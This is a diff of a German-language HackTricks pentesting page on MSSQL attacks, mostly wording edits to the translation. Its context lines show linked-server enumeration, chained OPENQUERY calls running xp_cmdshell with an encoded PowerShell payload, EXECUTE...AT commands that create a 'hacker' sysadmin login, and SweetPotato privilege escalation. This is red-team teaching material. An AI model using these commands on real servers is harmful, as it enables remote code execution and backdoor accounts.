@@ -2,11 +2,11 @@
 
 <details>
 
-<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 * Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS erhalten oder HackTricks im PDF-Format herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
+* Holen Sie sich den [**offiziellen PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**HackTricks-Repository**](https://github.com/carlospolop/hacktricks) **und das** [**HackTricks-Cloud-Repository**](https://github.com/carlospolop/hacktricks-cloud) **senden**.
 
@@ -16,14 +16,13 @@
 
 {% embed url="https://websec.nl/" %}
 
-
 ## **MSSQL Enumeration / Entdeckung**
 
 Das Powershell-Modul [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) ist in diesem Fall sehr nützlich.
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ```
-### Enumerieren aus dem Netzwerk ohne Domänen-Sitzung
+### Enumerieren aus dem Netzwerk ohne Domänesitzung
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -135,20 +134,20 @@ Notice, dass Metasploit nur die `openquery()`-Funktion in MSSQL missbrauchen wir
 
 Von **Linux** aus könnten Sie eine MSSQL-Konsolenshell mit **sqsh** und **mssqlclient.py** erhalten.
 
-Von **Windows** aus könnten Sie auch die Links finden und Befehle manuell mit einem **MSSQL-Client wie** [**HeidiSQL**](https://www.heidisql.com) ausführen.
+Von **Windows** aus könnten Sie auch die Links finden und Befehle manuell mit einem **MSSQL-Client wie** [**HeidiSQL**](https://www.heidisql.com) ausführen
 
 _Anmeldung mit Windows-Authentifizierung:_
 
-![](<../../.gitbook/assets/image (805).png>)
+![](<../../.gitbook/assets/image (808).png>)
 
 #### Vertrauenswürdige Links finden
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
 ```
-![](<../../.gitbook/assets/image (713).png>)
+![](<../../.gitbook/assets/image (716).png>)
 
-#### Führen Sie Abfragen in vertrauenswürdigem Link aus
+#### Führen Sie Abfragen über den vertrauenswürdigen Link aus
 
 Führen Sie Abfragen über den Link aus (Beispiel: Finden Sie weitere Links in der neuen zugänglichen Instanz):
 ```sql
@@ -158,7 +157,7 @@ select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 Überprüfen Sie, wo doppelte und einfache Anführungszeichen verwendet werden, es ist wichtig, sie auf diese Weise zu verwenden.
 {% endhint %}
 
-![](<../../.gitbook/assets/image (640).png>)
+![](<../../.gitbook/assets/image (643).png>)
 
 Sie können diese vertrauenswürdigen Links-Kette manuell endlos fortsetzen.
 ```sql
@@ -168,11 +167,9 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-Wenn Sie Aktionen wie `exec xp_cmdshell` von `openquery()` nicht ausführen können, versuchen Sie es mit der `EXECUTE`-Methode.
-
 ### Manuell - AUSFÜHREN
 
-Sie können auch vertrauenswürdige Verknüpfungen mit `EXECUTE` missbrauchen:
+Sie können auch vertrauenswürdige Verbindungen mit `EXECUTE` missbrauchen:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
@@ -180,12 +177,11 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 ```
 ## Lokale Privilegieneskalation
 
-Der **MSSQL-Local-User** hat in der Regel eine spezielle Art von Berechtigung namens **`SeImpersonatePrivilege`**. Dies ermöglicht dem Konto, "einen Client nach der Authentifizierung zu übernehmen".
+Der **MSSQL-Local-User** hat in der Regel eine spezielle Art von Privileg namens **`SeImpersonatePrivilege`**. Dies ermöglicht dem Konto, "einen Client nach der Authentifizierung zu übernehmen".
 
 Eine Strategie, die viele Autoren entwickelt haben, besteht darin, einen SYSTEM-Dienst dazu zu zwingen, sich bei einem von einem Angreifer erstellten Rogue- oder Man-in-the-Middle-Dienst zu authentifizieren. Dieser Rogue-Dienst kann dann den SYSTEM-Dienst imitieren, während er versucht, sich zu authentifizieren.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) enthält eine Sammlung dieser verschiedenen Techniken, die über den Befehl `execute-assembly` von Beacon ausgeführt werden können.
-
 
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
@@ -197,8 +193,8 @@ Eine Strategie, die viele Autoren entwickelt haben, besteht darin, einen SYSTEM-
 
 * Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS erhalten oder HackTricks im PDF-Format herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
+* Holen Sie sich den [**offiziellen PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**HackTricks-Repo**](https://github.com/carlospolop/hacktricks) **und das** [**HackTricks-Cloud-Repo**](https://github.com/carlospolop/hacktricks-cloud) **einreichen**.
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**HackTricks-Repo**](https://github.com/carlospolop/hacktricks) **und das** [**HackTricks-Cloud-Repo**](https://github.com/carlospolop/hacktricks-cloud) **einreichen.**
 
 </details>
